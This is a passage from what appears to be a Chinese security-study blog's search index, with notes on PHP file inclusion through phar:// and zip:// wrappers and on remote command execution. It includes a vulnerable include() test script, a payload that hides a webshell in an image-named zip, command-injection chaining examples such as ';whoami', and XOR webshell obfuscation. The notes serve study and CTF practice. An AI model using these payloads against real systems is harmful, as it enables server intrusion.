src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20211202151424208.png" alt="image-20211202151424208"></p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20211202151722218.png" alt="image-20211202151722218"></p><p>这里是在一个使用方法。</p><p>值得注意的是上面的提示，如果不将等号和加号变成url编码形式，是真的会识别不了。</p><h4 id="phar-x2F-x2F-伪协议："><a href="#phar-x2F-x2F-伪协议：" class="headerlink" title="phar:&#x2F;&#x2F;伪协议："></a>phar:&#x2F;&#x2F;伪协议：</h4><p>引用一下PHP手册上的介绍：</p><blockquote><p>phar:&#x2F;&#x2F; 数据流包装器自   PHP 5.3.0 起开始有效。详细的描述可参见 <a href="https://www.php.net/manual/zh/phar.using.stream.php">Phar 数据流包装器</a>。  </p></blockquote><p>这个函数就是PHP中解开压缩包的一个函数，不管后缀是什么，都可以作为压缩包来进行解压。</p><p>这里比较主要的用法就是首先写一个一句话木马，然后，再把木马变成一个zip格式的压缩包，将后缀改变为jpg,png格式，然后再把它传上去。</p><p>接下来就使用phar在url中进行一句话木马的访问，基本格式如下：</p><p>?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>测试代码</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=phar://shell.jpg/shell.php</span><br></pre></td></tr></table></figure><p>这样就将shell.php文件进行了一个文件包含。</p><h4 id="zip-x2F-x2F-伪协议："><a href="#zip-x2F-x2F-伪协议：" class="headerlink" title="zip:&#x2F;&#x2F;伪协议："></a>zip:&#x2F;&#x2F;伪协议：</h4><blockquote><p>zlib:&#x2F;&#x2F;</p><p>bzip2:&#x2F;&#x2F;</p><p>zip:&#x2F;&#x2F;</p></blockquote><p>以上三个伪协议的效果是一样的。</p><blockquote><p>   zlib: 的功能类似 <a href="https://www.php.net/manual/zh/function.gzopen.php">gzopen()</a>，但是   其数据流还能被 <a href="https://www.php.net/manual/zh/function.fread.php">fread()</a> 和其他文件系统函数使用。   不建议使用，因为会和其他带“:”字符的文件名混淆；   请使用 compress.zlib:&#x2F;&#x2F; 替代。  </p><p>   compress.zlib:&#x2F;&#x2F;、   compress.bzip2:&#x2F;&#x2F;   和 <a href="https://www.php.net/manual/zh/function.gzopen.php">gzopen()</a>、<a href="https://www.php.net/manual/zh/function.bzopen.php">bzopen()</a>   是相等的。并且可以在不支持 fopencookie 的系统中使用。  </p><p>   <a href="https://www.php.net/manual/zh/book.zip.php">ZIP 扩展</a> 注册了 zip: 封装器。     自 PHP 7.2.0 和 libzip 1.2.0+ 起，加密归档开始支持密码，允许数据流中使用密码。    字节流上下文（stream contexts）中使用 <code>&#39;password&#39;</code> 选项设置密码。  </p></blockquote><p>以上来自PHP手册。</p><p>zip:&#x2F;&#x2F;和phar:&#x2F;&#x2F;类似，但是用法不同。</p><p>使用格式：</p><p>?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名] </p><p>eg:<strong>zip:&#x2F;&#x2F;xxx.png#shell.php</strong></p><p>使用条件：</p><p>条件： PHP &gt; &#x3D;5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p><p>也就是在url中，要对#进行编码。</p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程代码执行</title>
      <link href="/2022/06/15/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE)/"/>
      <url>/2022/06/15/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE)/</url>
      
        <content type="html"><![CDATA[<h1 id="远程代码执行漏洞（RCE"><a href="#远程代码执行漏洞（RCE" class="headerlink" title="远程代码执行漏洞（RCE)"></a>远程代码执行漏洞（RCE)</h1><p><strong>RCE英文全称：remote command&#x2F;code execute（远程命令&#x2F;代码执行漏洞）</strong></p><p>分为远程命令执行ping和远程代码执行evel。</p><p>漏洞成因：命令执行漏洞形成的原因是web服务器对用户输入的命令安全监测不足，导致恶意代码被执行。</p><p>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。相当于直接操控服务器电脑的cmd命令行！高危漏洞！</p><p><strong>这里涉及到一个概念：ping</strong></p><p>Ping是Windows、Unix和Linux系统下的一个命令。ping也属于一个通信协议，是TCP&#x2F;IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。应用格式：ping空格IP地址</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220329113042498.png" alt="image-20220329113042498"></p><p>对于ping指令的一些补充：</p><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p><p>这个其实也可以类比为eval($_POST[‘’])；这种情况，当不控制转入的参数的时候，就会被控制。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>继承Web服务程序的权限去执行系统命令或读写文件<br> 反弹shell<br> 控制整个网站甚至控制服务器<br> 进一步内网渗透</p><h1 id="PHP涉及函数"><a href="#PHP涉及函数" class="headerlink" title="PHP涉及函数"></a>PHP涉及函数</h1><h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">isset()函数：用于检测变量是否已设置并且非 NULL。</span><br><span class="line">highlight_file()函数：对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。</span><br><span class="line">show_source()是 highlight_file() 的别名。</span><br><span class="line">eval()函数:用来执行一个字符串表达式，并返回表达式的值。</span><br><span class="line">next() 将内部指针指向数组中的下一个元素</span><br><span class="line">glob() 函数返回匹配指定模式的文件名或目录</span><br><span class="line">array_reverse()：将数组逆序排列</span><br><span class="line">array_rand(): 随机返回数组的键名</span><br><span class="line">array_flip()：交换数组的键和值</span><br><span class="line">session_start(): 告诉PHP使用session;</span><br><span class="line">session_id(): 获取到当前的session_id值；</span><br><span class="line">rev():将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。</span><br></pre></td></tr></table></figure><h2 id="输出函数"><a href="#输出函数" class="headerlink" title="输出函数"></a>输出函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat函数 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac函数 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">nl      类似于cat -n，显示时输出行号</span><br><span class="line">more    根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head    只显示头几行</span><br><span class="line">tail    只显示最后几行</span><br></pre></td></tr></table></figure><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system() 输出并返回最后一行shell结果。</span><br><span class="line">exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</span><br><span class="line">passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。（替换system）</span><br></pre></td></tr></table></figure><h2 id="获取文件内容函数"><a href="#获取文件内容函数" class="headerlink" title="获取文件内容函数"></a>获取文件内容函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pos()是current()的别名</span><br><span class="line">pos():返回数组中当前元素的值</span><br><span class="line">scandir()：函数返回一个数组，其中包含指定路径中的文件和目录(获取目录下的文件)</span><br><span class="line">localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br></pre></td></tr></table></figure><h1 id="正则表达式："><a href="#正则表达式：" class="headerlink" title="正则表达式："></a>正则表达式：</h1><h3 id="元字符："><a href="#元字符：" class="headerlink" title="元字符："></a>元字符：</h3><p>1、**+**，+ 号代表前面的字符必须至少出现一次（1次或多次）。</p><p>2、*****，* 号代表前面的字符可以不出现，也可以出现一次或者多次（0次、或1次、或多次）。</p><p>3、<strong>？</strong>，? 问号代表前面的字符最多只可以出现一次（0次或1次）。</p><p><strong>其中<code>+</code> <code>*</code>具有贪婪性，这两个元字符会尽可能多的匹配字符。如果希望实现最小匹配、或是非贪婪，可以使用？来限制。</strong></p><h3 id="普通字符："><a href="#普通字符：" class="headerlink" title="普通字符："></a>普通字符：</h3><p>普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。</p><p><code>[ABC]  匹配括号中的所有字符。</code></p><p><code>[^ABC]  匹配除了中括号中的所有字符</code></p><p><code>[A-Z]  表示一个区间，其中匹配所有的大写字母（当然，也可以[A-z]匹配所有的大小写）</code></p><p><code>.  匹配除了换行符之外的任何单个字符</code></p><p><code>[\s\S]  匹配所有，\s是匹配所有空白符，包括换行符，\S是匹配所有非空白符，不包括换行。</code></p><p><code>\w  匹配字母、数字、下划线</code></p><h3 id="非打印字符："><a href="#非打印字符：" class="headerlink" title="非打印字符："></a>非打印字符：</h3><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220329123107547.png" alt="image-20220329123107547"></p><h3 id="特殊字符："><a href="#特殊字符：" class="headerlink" title="特殊字符："></a>特殊字符：</h3><p>许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符\ 放在它们前面。下表列出了正则表达式中的特殊字符：</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220330191040233.png" alt="image-20220330191040233"></p><h3 id="限定符："><a href="#限定符：" class="headerlink" title="限定符："></a>限定符：</h3><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。</p><p>正则表达式的限定符有：</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220330191139231.png" alt="image-20220330191139231"></p><h3 id="定位符："><a href="#定位符：" class="headerlink" title="定位符："></a>定位符：</h3><p>定位符使您能够将正则表达式固定到行首或行尾。它们还使您能够创建这样的正则表达式，这些正则表达式出现在一个单词内、在一个单词的开头或者一个单词的结尾。</p><p>定位符用来描述字符串或单词的边界，^ 和 $ 分别指字符串的开始与结束，\b 描述单词的前或后边界，\B 表示非单词边界。</p><p>正则表达式的定位符有：</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220330200551984.png" alt="image-20220330200551984"></p><p>不能将限定符和定位符一起使用，因为在紧靠换行或者单词边界的前面或者后面不能有一个以上的位置（？）</p><p>所以不能使用<code>^*</code>这种形式的表达式。</p><p>如果要匹配一行文本开始的地方的文本，要在正则表达式的开始使用^字符。</p><p><strong>单词边界是单词和空格之间的位置。非单词边界是任何其他位置。</strong></p><p>\b 字符的位置是非常重要的。如果它位于要匹配的字符串的开始，它在单词的开始处查找匹配项。如果它位于字符串的结尾，它在单词的结尾处查找匹配项。</p><p>字符串 apt 出现在单词 Chapter 中的非单词边界处，但出现在单词 aptitude 中的单词边界处。对于 \B 非单词边界运算符，不可以匹配单词的开头或结尾。</p><p>这两个东西比较重要的作用就是可以标识想要匹配的字符串到底是在一个单词的开头还是中间，或是结尾。通过对部分字符串的位置进行标识，可以做到对匹配进行过滤。</p><p>eg:</p><p>可以只匹配 Chapter 中的字符串 apt，但不匹配 aptitude 中的字符串 apt。</p><h3 id="反向引用："><a href="#反向引用：" class="headerlink" title="反向引用："></a>反向引用：</h3><p>对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。</p><p>缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 \n 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p><p>可以使用非捕获元字符<code> ?:</code>、<code>?= </code>或 <code>?!</code> 来重写捕获，忽略对相关匹配的保存。 </p><p>基本应该就是引用其中一段的匹配式。</p><h3 id="修饰符："><a href="#修饰符：" class="headerlink" title="修饰符："></a>修饰符：</h3><p>标记也称为修饰符，正则表达式的标记用于指定额外的匹配策略。</p><p>标记不写在正则表达式里，标记位于表达式之外，格式如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/pattern/flags</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220330211825418.png" alt="image-20220330211825418"></p><h3 id="元字符：-1"><a href="#元字符：-1" class="headerlink" title="元字符："></a>元字符：</h3><p><a href="https://www.runoob.com/regexp/regexp-metachar.html">https://www.runoob.com/regexp/regexp-metachar.html</a></p><h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><p>在Linux中，通配符?表示匹配单个字符。</p><p>这个就和之前表示的不一样了，需要特别看一下。</p><blockquote><p>\i 与大小写都进行匹配<br> \w 与任意单词字符匹配，任意单词字符表示 [A-Z]、 [a-z]、[0-9]、_<br> \d 与任意数字匹配</p></blockquote><p>上面这部分可以直接看元字符</p><h2 id="Windows环境下的管道符："><a href="#Windows环境下的管道符：" class="headerlink" title="Windows环境下的管道符："></a>Windows环境下的管道符：</h2><p>1、<code>|</code>，表示直接执行后面的语句。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220330213250836.png" alt="image-20220330213250836"></p><p>直接执行了后面的whoami语句。</p><p>2、<code>||</code>，如果前面执行的语句出错（包括但不限于命令语句出错或者是后面的语句部分出错），就执行后面的语句。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220330213427396.png" alt="image-20220330213427396"></p><p>3、<code>&amp;</code>，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220401235516607.png" alt="image-20220401235516607"></p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220401235642058.png" alt="image-20220401235642058"></p><p>4、<code>&amp;&amp;</code>，如果前面的语句为真，则先执行第一个命令，后执行第二个命令。如果为假，就两个都不执行。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220401235819393.png" alt="image-20220401235819393"></p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220401235925143.png" alt="image-20220401235925143"></p><h2 id="Linux环境下的管道符："><a href="#Linux环境下的管道符：" class="headerlink" title="Linux环境下的管道符："></a>Linux环境下的管道符：</h2><p>1、<code>;</code>当执行完了前面的命令之后，就执行后面的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com;whoami</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/1600512054_5f65e0364695687b45fad.png!small" alt="1600512054_5f65e0364695687b45fad.png!small"></p><p>2、<code>|</code>，只显示后面语句的执行结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com|whoami</span><br></pre></td></tr></table></figure><p>3、<code>||</code>，当前面的语句执行错误的时候，会执行后面的语句。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/1600512086_5f65e056a06ea92ce6174.png!small" alt="1600512086_5f65e056a06ea92ce6174.png!small"></p><p>4、<code>&amp;</code>，如果前面的语句为假，则直接指向后面的语句，前面的语句可真可假</p><h2 id="无数字字母构造webshell："><a href="#无数字字母构造webshell：" class="headerlink" title="无数字字母构造webshell："></a>无数字字母构造webshell：</h2><p>当对输入进行了过滤之后，可以通过运算和拼接的方式来得到需要的字母或是数字。</p><p>常见的运算方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、异或运算</span><br><span class="line">2、按位与运算</span><br><span class="line">3、按位或运算</span><br></pre></td></tr></table></figure><p>例如在PHP中，当将两个变量的值进行异或的时候，会首先将两个变量的值转换为ascii，然后再将ascii进行二进制转换，之后再将两个变量进行异或，后将异或结果转换为ascii，将ascii转换为字符串。。</p><p>（这种PHP中的绕过方式其实是很常见的。）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">两个变量-&gt;转换为ascii-&gt;转换为二进制-&gt;进行异或-&gt;异或二进制转换为ascii-&gt;转换为字符串。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
